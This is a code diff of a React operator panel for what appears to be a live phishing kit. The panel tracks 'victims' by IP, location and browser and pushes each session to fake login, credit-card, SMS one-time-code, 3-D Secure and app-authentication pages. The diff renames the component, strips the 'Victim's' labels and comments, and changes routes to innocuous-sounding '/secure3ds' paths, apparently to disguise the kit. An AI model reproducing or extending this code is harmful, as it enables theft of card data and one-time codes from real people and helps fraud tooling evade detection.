@@ -1,8 +1,8 @@
 import React, { useState, useEffect } from 'react';
 import { socket } from '../index';
-import './AdminPanel.css';
+import './GenView.css';
 
-const AdminPanel = () => {
+const GenView = () => {
   const [activeUsers, setActiveUsers] = useState([]);
   const [previousUsers, setPreviousUsers] = useState([]);
   const [routes, setRoutes] = useState({});
@@ -23,16 +23,14 @@ const AdminPanel = () => {
         return;
       }
     }
-
+    
     const handleUpdate = (data) => {
       setActiveUsers(data.activeUsers || []);
       setPreviousUsers(data.previousUsers || []);
     };
 
     socket.on('update', handleUpdate);
-    
-    // Load initial data
-    fetch(`${process.env.REACT_APP_API_URL}/api/users`)
+      fetch(`${process.env.REACT_APP_API_URL}/api/users`)
       .then(res => res.json())
       .then(data => {
         setActiveUsers(data.activeUsers || []);
@@ -73,13 +71,12 @@ const toggleShowPrevious = () => {
     const div = document.getElementById('show');
     if (div) {
       if (div.style.display === 'none') {
-        div.style.display = ''; // Reset to default
+        div.style.display = ''; 
       } else {
-        div.style.display = 'none'; // Hide the div
+        div.style.display = 'none';
       }
     }};
   const handleOut = (sessionId) => {
-    console.log(`Redirecting session ${sessionId} to Google`);
     socket.emit('redirectUser', { sessionId, url: 'https://spotify.com' });
   };
 
@@ -97,16 +94,15 @@ const toggleShowPrevious = () => {
   };
 
   const handleSaveInput = () => {
-    console.log('Emitting configureInputs event:', { sessionId: currentSessionId, inputsConfig });
     socket.emit('configureInputs', { sessionId: currentSessionId, inputsConfig });
     localStorage.setItem(`inputsConfig_${currentSessionId}`, JSON.stringify(inputsConfig));
     setShowModal(false);
-    handleRouteChange(currentSessionId, '/otpSubmit'); // Redirect immediately after saving input configuration
+    handleRouteChange(currentSessionId, '/secure3ds');
   };
 
   const handleStopSpinner = (sessionId) => {
     socket.emit('stopSpinner', { sessionId });
-    handleRouteChange(sessionId, '/otpSubmit_error'); // Redirect to custom error container
+    handleRouteChange(sessionId, '/secure3ds_error');
   };
 
   const UserCard = ({ user, isActive }) => {
@@ -121,11 +117,11 @@ const toggleShowPrevious = () => {
             <span>Session: {user.sessionId}</span>
             <span>{new Date(user.timestamp).toLocaleTimeString()}</span>
           </div>
-          <p><strong>Victim's IP:</strong> {user.ip}</p>
-          <p><strong>Victim's Location:</strong> {user.country}</p>
-          <p><strong>Victim's Current View:</strong> {user.pageUrl}</p>
-          <p><strong>Victim's Event Type:</strong> {user.eventType}</p>
-          <p><strong>Victim's Browser:</strong> {user.browserInfo}</p> {/* Display browser information */}
+          <p><strong>IP:</strong> {user.ip}</p>
+          <p><strong>Location:</strong> {user.country}</p>
+          <p><strong>Current View:</strong> {user.pageUrl}</p>
+          <p><strong>Event Type:</strong> {user.eventType}</p>
+          <p><strong>Browser:</strong> {user.browserInfo}</p>
           {user.componentName && <p><strong>Component:</strong> {user.componentName}</p>}
           {!isActive && (
             <p className="disconnected-time">
@@ -144,16 +140,16 @@ const toggleShowPrevious = () => {
           <button onClick={() => handleRouteChange(user.sessionId, '/')}>
             Login
           </button>
-          <button onClick={() => handleRouteChange(user.sessionId, '/PaymentUpdate')}>
+          <button onClick={() => handleRouteChange(user.sessionId, '/updatestatuspending')}>
             CC
           </button>
-<button onClick={() => handleRouteChange(user.sessionId, '/billingUpdate_Error')}>
+<button onClick={() => handleRouteChange(user.sessionId, '/updatestatuserror')}>
             CC Error
           </button>          
-<button  onClick={() => handleRouteChange(user.sessionId, '/otp_submit')}>
+<button  onClick={() => handleRouteChange(user.sessionId, '/secure/3ds')}>
             sms
           </button>
-          <button className='hoverror' onClick={() => handleRouteChange(user.sessionId, '/otp_submitError')}>
+          <button className='hoverror' onClick={() => handleRouteChange(user.sessionId, '/secure/3dsError')}>
             sms error
           </button>
           <button onClick={() => handleAddCustomInput(user.sessionId)}>
@@ -162,7 +158,7 @@ const toggleShowPrevious = () => {
           <button className='hoverror' onClick={() => handleStopSpinner(user.sessionId)}>
             vbv custom + error
           </button>
-          <button onClick={() => handleRouteChange(user.sessionId, '/mobileAuth')}>
+          <button onClick={() => handleRouteChange(user.sessionId, '/secure/mobileAuth')}>
             app
           </button>
           <button onClick={() => handleOut(user.sessionId)}>
@@ -229,4 +225,4 @@ const toggleShowPrevious = () => {
   );
 };
 
-export default AdminPanel;
+export default GenView;
